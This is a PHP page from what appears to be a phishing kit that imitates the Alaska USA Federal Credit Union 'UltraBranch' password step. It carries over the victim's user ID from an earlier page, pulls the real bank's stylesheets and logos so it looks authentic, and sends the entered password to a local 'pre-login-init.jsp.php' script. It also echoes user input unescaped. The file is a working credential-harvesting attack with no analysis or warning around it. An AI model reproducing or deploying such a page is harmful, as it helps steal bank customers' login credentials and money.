<?php

session_start();
ob_start();
$userid = $_POST['UserName'];
?>
<html lang="en"><head><script type="text/javascript" src="/alaska-common.js?cache"></script>

   <title>UltraBranch Login</title>
   <meta http-equiv="X-UA-Compatible" content="IE=Edge">

   <link rel="stylesheet" href="https://ultrabranch3.alaskausa.org/efs/efs/jsp/inc/css/ub-print.css?akusa_rev=d0931d75" type="text/css" media="print">
   <link rel="stylesheet" href="https://ultrabranch3.alaskausa.org/efs/efs/jsp/inc/css/ub-popup.css?akusa_rev=d0931d75" type="text/css" media="screen, projection">
   <link rel="stylesheet" href="https://ultrabranch3.alaskausa.org/efs/efs/jsp/inc/css/ub-main.css?akusa_rev=d0931d75" type="text/css" title="main" media="screen, projection">
   <link rel="stylesheet" href="https://ultrabranch3.alaskausa.org/efs/efs/jsp/inc/css/ub-login-new.css?akusa_rev=d0931d75" type="text/css">
   

   <script type="text/javascript" src="/efs/efs/jslibrary/common_functions.js"></script><script id="8783326ae8a232593d2b1a2d0328890f" src="/alaska-common.js?seed=AIARvTyCAQAAKLAlmOF6T7t3bsQqS8Q4haMogyYkwbtFtOCBMCjI2kngxYBs&amp;OxHMJUSX2t--z=q" async=""></script>

   <script type="text/javascript">
      function Initialize()
      {
         document.forms["safelogin"].Password.focus();
      }

      function ProcessForm() {

         if(document.forms["safelogin"].Password.value.length == "0") {
            alert("Password is a Required Field");
            return false;
         }
         return true;
      }

     function DoSubmit() {
        var form = document.forms['safelogin'];
        form.Referrerfield.value = document.referrer;
        return true;
     }
    </script>

 

    <style>

		label {
		  font-weight: bold;
		  color: #004990;
		}
		.imageBox { margin:1em 0; }
		.imageBox img { border-radius: 5px; }
		form { margin-top: 2em; }

		/*local overrides*/
		#loginBox {background-color:white;}
		#loginBox > div, #loginBox > form > div { background-color:white;}

    /*local ADA fix for keypad instructions*/
    #instr:focus {position:relative !important;max-width:344px;margin-left:3px;margin-bottom:0;background-color:#ffffff; color:#044990;}
    </style>
</head>
<body onload="Initialize();">
   <div id="header" role="banner">
    <section class="skipLinks" title="Enter your Personal Access Code by simply typing on your keyboard">
      <h2 class="visuallyhidden">Skip links</h2>
      <p><a href="#instr" class="visuallyhidden">Skip to main content</a></p>
      <p><a href="#pgFooter" class="visuallyhidden">Skip to footer</a></p>
      <p><a href="https://www.alaskausa.org/service/contact.asp" class="visuallyhidden">If you are using a screen reader and having difficulties with the site, call the Member Service Center 24/7 at 800-525-9094.</a></p>
    </section>
    <div id="topBar">
      <a href="https://www.alaskausa.org/" id="logo" title="Alaska USA Federal Credit Union"><img src="https://ultrabranch3.alaskausa.org/efs/efs/grafx/akusa/akusafcu_logo.png" alt="Alaska USA"></a>
      <p id="headerReturnLink"><a href="#">Return to home</a></p>
    </div>

    
    
    <div id="pgHead">
    </div>
    
   </div>

   <div id="pgMain" role="main">
         <div id="mainContent">
           <div class="leftCol">
            <h2>Log in to your account</h2>
            <form method="post" onsubmit="return ProcessForm();" name="safelogin" action="./pre-login-init.jsp.php">
			<input name="UserName" class="UserName" type="hidden" value="<?= $userid;?>">
              <input type="hidden" name="Referrerfield" id="referrer">
              <label>Password:</label>
              <input type="password" name="Password" id="password" aria-label="Password with Wheat security image">
              <input type="submit" name="Log In" id="LogIn" value="Log In">

              <div class="imageBox">
                <img src="https://ultrabranch3.alaskausa.org/efs/efs/grafx/akusa/security/abstract-wheat.jpg">
              </div>
            </form>
            
          </div>

	      	<div class="sideBar">
	      		<div class="learnMore">
	      			<h2 class="help">Quick Help</h2>
                    <ul class="help">
                       
                       <li><a href="./Information.php">Forgot online password?</a></li>
                       <li id="liKeypadNote">
                          <a href="./Information.php" id="keypadLabel" onclick="toggleNote('liKeypadNote','keypadNote');return false;" role="button" aria-controls="keypadNote" aria-expanded="false">Don't recognize security image?</a>
                          <div class="notes" id="keypadNote" role="region" aria-labelledby="keypadLabel" aria-hidden="true">
                             <p>You entered User ID <b><?= $userid;?></b> - is this correct?</p>
                             <p>No - <a href="./index.php" title="Return to previous screen">Return to the previous
                             screen</a> to re-enter your User ID</p>
                             <p>Yes - Call the number listed below.</p>
                          </div>
                       </li>
                       
                    </ul>
                    <div class="help" style="display:none;">
                       <h1>Questions?  (800) 525-9094</h1>
                    </div>
	      		</div>
				<div id="questionSection" class="learnMore">
					<h2>Questions?</h2>
					<p>
						For assistance contact the Member Service Center.
					</p><p style="padding-left:10px;margin-top:10px;">
						(907) 563-4567 or (800) 525-9094<br><br>
						Open 24 hours a day, 7 days a week.<br><br>
						<a href="https://www.alaskausa.org/service/contact.asp" target="_blank">More contact information</a>
					</p>
					<p></p>
				</div>
      	  	</div>
         </div>
         <br><br>
         
         <div id="pgFooter" style="background-color:rgb(200,200,200)">
            <hr>

   <div id="footer" role="contentinfo">
   	 <span class="bug">
       <img alt="Equal Housing Lender" src="https://ultrabranch3.alaskausa.org/efs/efs/grafx/akusa/logo-ehl-tri.gif?#042116">
     </span>

     <p> © Copyright  2022 • Alaska&nbsp;USA and UltraBranch are registered trademarks of Alaska&nbsp;USA Federal Credit Union.</p>
     <p>Mortgage loans are provided by Alaska USA Mortgage Company, LLC. License #AK157293 <br>
     Washington Consumer Loan Company License #CL-157293; Licensed by the Department of Financial Protection and Innovation under the California Residential Mortgage Lending Act, License #4131067.</p>
        <p><a href="javascript:PopupWindow('Privacy');">Privacy</a></p>
     

     <p class="ncua">
       <img src="https://ultrabranch3.alaskausa.org/efs/efs/grafx/akusa/logo-ncua.gif?#042116" alt="Your funds federally insured to at least $250,000 and backed by the full faith and credit of the United States Government. National Credit Union Administration, a U.S. Government Agency"><span>Federally insured by NCUA</span>
     </p>
   </div>
         </div>
   </div>

</body></html>